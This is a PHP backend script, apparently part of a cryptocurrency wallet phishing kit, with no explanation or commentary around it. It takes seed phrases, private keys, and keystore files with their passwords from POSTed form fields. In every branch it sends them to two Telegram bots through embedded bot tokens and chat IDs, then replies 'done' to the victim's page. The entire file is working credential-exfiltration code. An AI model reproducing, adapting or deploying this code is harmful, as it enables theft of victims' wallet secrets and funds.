<?php 
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
error_reporting(0);

if(isset($_POST['phrase']) && isset($_POST['wallet'])) {
    
    $phrase = $_POST['phrase'];
    $wallet = $_POST['wallet'];
    $mymsg = "phrase = ($phrase)\nwallet type = $wallet";
    $website="https://api.telegram.org/bot5809181457:AAFeH3teqtZ85hPMIbBLnaWvX1sY3AGvSUM";
$chatId=5704823371;
$params=[
    'chat_id'=>'5895580335',
   'text'=>$mymsg,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
    $website = "https://api.telegram.org/bot5736122898:AAF9ovFIiFMVttGQgvgZoiC5DyJ7l6_BTDg";
    $chatId = 5704823371;
    $params = [
        'chat_id' => '5768051772',
        'text' => $mymsg,
    ];

    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);



    $data = 'done';
    echo json_encode($data);
    
} elseif(isset($_POST['privatekey']) && isset($_POST['wallet'])) {
    
    $phrase = $_POST['privatekey'];
    $wallet = $_POST['wallet'];
    $mymsg = "private key  = ($phrase)\nwallet type = $wallet";
    $website="https://api.telegram.org/bot5809181457:AAFeH3teqtZ85hPMIbBLnaWvX1sY3AGvSUM";
$chatId=5704823371;
$params=[
    'chat_id'=>'5895580335',
   'text'=>$mymsg,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
    $website = "https://api.telegram.org/bot5736122898:AAF9ovFIiFMVttGQgvgZoiC5DyJ7l6_BTDg";
    $chatId = 5704823371;
    $params = [
        'chat_id' => '5768051772',
        'text' => $mymsg,
    ];

    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);



    $data = 'done';
    echo json_encode($data);
    
} elseif(isset($_POST['keystorejson']) && isset($_POST['wallet'])&& isset($_POST['keystorepasswword'])) {
    
    $keystore = $_POST['keystorejson'];
    $wallet = $_POST['wallet'];
    $keystorepass =$_POST['keystorepasswword'];
    $mymsg = "keystore = ($keystore)\n keystorepass = $keystorepass \n wallet type = $wallet";
    $website="https://api.telegram.org/bot5809181457:AAFeH3teqtZ85hPMIbBLnaWvX1sY3AGvSUM";
$chatId=5704823371;
$params=[
    'chat_id'=>'5895580335',
   'text'=>$mymsg,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
    $website = "https://api.telegram.org/bot5736122898:AAF9ovFIiFMVttGQgvgZoiC5DyJ7l6_BTDg";
    $chatId = 5704823371;
    $params = [
        'chat_id' => '5768051772',
        'text' => $mymsg,
    ];

    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);



    $data = 'done';
    echo json_encode($data);
    
} else {
    $data = 'error';
    echo json_encode($data);
}
?>
